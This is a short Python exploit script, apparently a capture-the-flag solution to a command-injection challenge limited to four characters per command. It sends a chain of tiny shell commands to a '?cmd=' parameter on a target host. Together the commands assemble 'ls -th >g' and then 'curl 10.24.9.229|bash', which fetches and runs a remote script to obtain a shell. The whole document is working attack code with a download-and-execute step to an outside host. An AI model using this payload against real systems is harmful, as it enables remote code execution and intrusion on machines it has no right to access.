#!/usr/bin/python
import requests
from time import sleep
from urllib.parse import quote

payload = [ 
    # generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl',
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x', 

    # generate "curl orange.tw|python;"
    # generate "curl 10.24.9.229|bash" 
    
    '>\;\\',
    '>sh\\', 
    '>ba\\',
    '>\|\\',
    '>29\\',
    '>.2\\',
    '>.9\\',
    '>24\\',
    '>0.\\',
    '>1\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',

    # got shell
    'sh x', 
    'sh g',
]

url = 'http://172.21.4.12:1023'
r = requests.get(url)
for i in payload:
    assert len(i) <= 4 
    r = requests.get('http://172.21.4.12:1023//?cmd=' + quote(i) )
    print(i)
    sleep(0.2)
